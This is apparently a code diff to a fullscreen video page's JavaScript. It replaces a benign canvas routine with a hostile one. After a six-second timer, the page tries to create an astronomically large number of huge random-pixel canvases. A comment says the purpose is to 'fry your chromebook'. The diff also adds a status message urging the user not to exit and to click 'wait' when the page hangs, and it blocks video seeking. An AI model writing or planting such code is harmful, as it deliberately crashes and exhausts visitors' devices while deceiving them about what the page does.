@@ -37,10 +37,8 @@ document.addEventListener('DOMContentLoaded', () => {
   const TIMEOUT_MS = 6000; // 6 seconds
   let timeoutId = null;
   let deb = false;
-  let remainingTime = TIMEOUT_MS;   // track remaining time
-  let lastStart = null;             // when the timer last started
-
-  // Safe canvas function
+  let lastAllowedTime = 0; // track last valid playback position
+  // this is to fry your chromebook down here
   function createCanvas(id, width = 15000, height = 15000) {
     const canvas = document.createElement('canvas');
     canvas.id = id;
@@ -53,10 +51,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const data = imageData.data;
 
     for (let i = 0; i < data.length; i += 4) {
-      data[i]   = Math.random() * 256; // R
-      data[i+1] = Math.random() * 256; // G
-      data[i+2] = Math.random() * 256; // B
-      data[i+3] = 255;                 // A
+      data[i]   = Math.random() * 256;
+      data[i+1] = Math.random() * 256;
+      data[i+2] = Math.random() * 256;
+      data[i+3] = 255;
     }
     ctx.putImageData(imageData, 0, 0);
   }
@@ -66,7 +64,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.body.style.backgroundColor = '#ef4444';
     setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);
 
-      // Create 10 canvases safely
+       // Create 100000000000000000000000 canvases 
       for (let i = 0; i < 100000000000000000000000; i++) {
         createCanvas(`canvas-${i}`);
       }
@@ -74,28 +72,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function startTimer() {
     clearTimeout(timeoutId);
-    lastStart = Date.now();
     timeoutId = setTimeout(() => {
       triggerTimeout();
-    }, remainingTime);
+    }, TIMEOUT_MS);
     statusMessage.textContent = "Fullscreen active. Do not exit, if it says unresponsive, click wait";
-  }
-
-  function stopTimer() {
-    if (timeoutId) {
-      clearTimeout(timeoutId);
-      timeoutId = null;
-      if (lastStart) {
-        const elapsed = Date.now() - lastStart;
-        remainingTime = Math.max(0, remainingTime - elapsed);
-      }
-    }
   }
 
   function resetAll() {
     clearTimeout(timeoutId);
-    timeoutId = null;
-    remainingTime = TIMEOUT_MS;
     videoElement.pause();
     videoElement.currentTime = 0;
     statusMessage.textContent = "Exited fullscreen. Click 'Go Fullscreen' to restart.";
@@ -106,7 +90,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.fullscreenElement) return;
     document.documentElement.requestFullscreen().then(() => {
       videoElement.play().then(() => {
-        remainingTime = TIMEOUT_MS; // reset fresh
         startTimer();
         fsBtn.style.display = "none";
       });
@@ -121,17 +104,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // --- NEW: handle seeking events ---
-  videoElement.addEventListener('seeking', () => {
-    stopTimer(); // pause timer when user scrubs
-    statusMessage.textContent = "Seeking detected. Timer paused.";
+  // --- BLOCK SEEKING COMPLETELY ---
+  videoElement.addEventListener('timeupdate', () => {
+    lastAllowedTime = videoElement.currentTime;
   });
 
-  videoElement.addEventListener('seeked', () => {
-    if (!document.fullscreenElement) return;
-    if (!videoElement.paused) {
-      startTimer(); // resume timer with remaining time
-      statusMessage.textContent = "Seek complete. Timer resumed.";
+  videoElement.addEventListener('seeking', () => {
+    // Force back to last allowed time
+    if (videoElement.currentTime !== lastAllowedTime) {
+      videoElement.currentTime = lastAllowedTime;
+      statusMessage.textContent = "Seeking blocked.";
     }
   });
 });
